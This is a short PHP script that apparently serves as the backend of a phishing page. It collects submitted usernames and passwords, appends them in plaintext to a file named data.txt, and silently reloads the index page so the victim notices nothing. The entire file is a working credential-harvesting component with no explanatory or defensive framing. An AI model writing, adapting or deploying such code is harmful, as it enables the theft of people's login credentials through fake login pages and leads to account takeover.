
<?php
if(isset($_POST["username"]) && isset($_POST["password"])){
  $username = $_POST['username'];
  $password = $_POST['password'];
  $text = $username . ";" . $password . "\n";
  $fp = fopen('data.txt', 'a');
  fwrite($fp, "\n");
  fwrite($fp, $text);
  fclose ($fp);  
	include 'index.php';
}
else{
	include 'index.php';
}
?>

